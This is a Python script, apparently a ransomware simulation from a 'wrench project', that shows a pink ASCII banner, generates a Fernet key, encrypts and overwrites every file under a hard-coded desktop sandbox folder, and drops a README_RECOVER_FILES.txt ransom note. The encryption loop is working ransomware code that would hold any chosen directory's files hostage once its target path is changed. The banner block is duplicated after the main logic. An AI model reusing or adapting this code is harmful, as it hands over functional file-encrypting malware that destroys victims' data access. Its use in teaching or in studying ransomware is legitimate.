import os
from cryptography.fernet import Fernet
# Banner
from datetime import datetime
from colorama import init, Fore, Style

init()

banner = (
    "\033[38;5;205m"  # Start bright pink
    r"""
  _____                _____        ______  _____   ______         _____    ____   ____ 
 |\    \   _____   ___|\    \   ___|\     \|\    \ |\     \    ___|\    \  |    | |    |
 | |    | /    /| |    |\    \ |     \     \\\    \| \     \  /    /\    \ |    | |    |
 \/     / |    || |    | |    ||     ,_____/|\|    \  \     ||    |  |    ||    |_|    |
 /     /_  \   \/ |    |/____/ |     \--'\_|/ |     \  |    ||    |  |____||    .-.    |
|     // \  \   \ |    |\    \ |     /___/|   |      \ |    ||    |   ____ |    | |    |
|    |/   \ |    ||    | |    ||     \____|\  |    |\ \|    ||    |  |    ||    | |    |
|\ ___/\   \|   /||____| |____||____ '     /| |____||\_____/||\ ___\/    /||____| |____|
| |   | \______/ ||    | |    ||    /_____/ | |    |/ \|   ||| |   /____/ ||    | |    |
 \|___|/\ |    | ||____| |____||____|     | / |____|   |___|/ \|___|    | /|____| |____|
    \(   \|____|/   \(     )/    \( |_____|/    \(       )/     \( |____|/   \(     )/  
     '      )/       '     '      '    )/        '       '       '   )/       '     '
"""
    "\033[0m"  # Reset color
)

print(banner)

print(Fore.WHITE + "\n****************************************************************")
print("*  Copyright of wrench project, 2025                           *")
print(f"*  Loaded at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                *")
print("****************************************************************" + Style.RESET_ALL)

# This Generates and save encryption key
key = Fernet.generate_key()
with open("secret.key", "wb") as key_file:
    key_file.write(key)

# this creates Fernet object
cipher = Fernet(key)

# this defines target directory
target_dir = r"C:\Users\home\OneDrive\Desktop\sandbox"  

# this walks through files and encrypt them
for root, dirs, files in os.walk(target_dir):
    for filename in files:
        file_path = os.path.join(root, filename)

        # Skip the key file itself
        if filename == "secret.key":
            continue

        # Read file contents
        with open(file_path, "rb") as f:
            data = f.read()

        # Encrypt data
        encrypted_data = cipher.encrypt(data)

        # Overwrite the file with encrypted content
        with open(file_path, "wb") as f:
            f.write(encrypted_data)

# this creates ransom note
note_path = os.path.join(target_dir, "README_RECOVER_FILES.txt")
with open(note_path, "w") as note:
    note.write(
        "Your files have been encrypted!\n\n"
        "To recover them, you need the secret key.\n"
        "This is a simulation — no payment is required.\n"
    )
# Banner
from datetime import datetime
from colorama import init, Fore, Style

init()

banner = (
    "\033[38;5;205m"  # Start bright pink
    r"""
  _____                _____        ______  _____   ______         _____    ____   ____ 
 |\    \   _____   ___|\    \   ___|\     \|\    \ |\     \    ___|\    \  |    | |    |
 | |    | /    /| |    |\    \ |     \     \\\    \| \     \  /    /\    \ |    | |    |
 \/     / |    || |    | |    ||     ,_____/|\|    \  \     ||    |  |    ||    |_|    |
 /     /_  \   \/ |    |/____/ |     \--'\_|/ |     \  |    ||    |  |____||    .-.    |
|     // \  \   \ |    |\    \ |     /___/|   |      \ |    ||    |   ____ |    | |    |
|    |/   \ |    ||    | |    ||     \____|\  |    |\ \|    ||    |  |    ||    | |    |
|\ ___/\   \|   /||____| |____||____ '     /| |____||\_____/||\ ___\/    /||____| |____|
| |   | \______/ ||    | |    ||    /_____/ | |    |/ \|   ||| |   /____/ ||    | |    |
 \|___|/\ |    | ||____| |____||____|     | / |____|   |___|/ \|___|    | /|____| |____|
    \(   \|____|/   \(     )/    \( |_____|/    \(       )/     \( |____|/   \(     )/  
     '      )/       '     '      '    )/        '       '       '   )/       '     '
"""
    "\033[0m"  # Reset color
)

print(banner)

print(Fore.WHITE + "\n****************************************************************")
print("*  Copyright of wrench project, 2025                           *")
print(f"*  Loaded at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                *")
print("****************************************************************" + Style.RESET_ALL)
print("Encryption complete. Ransom note created.")
